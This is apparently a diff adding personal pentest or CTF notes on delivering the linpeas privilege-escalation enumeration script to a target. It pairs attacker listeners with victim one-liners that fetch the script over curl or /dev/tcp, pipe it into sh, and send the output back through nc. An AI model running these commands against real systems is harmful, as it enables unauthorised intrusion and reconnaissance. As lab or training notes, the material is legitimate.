@@ -1,0 +1,21 @@
+linpeas
+
+# Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+
+# Without curl
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+# Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out #Host
+curl 10.21.109.242:80/linpeas.sh | sh | nc 10.21.109.242 9002 #Victim
+
+
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+nc -lvnp 9002 | tee linpeas.out #Host
+cat < /dev/tcp/10.21.109.242/80  | sh | nc 10.21.109.242 9002  
+
+read the result 
+less -r linpeas.txt
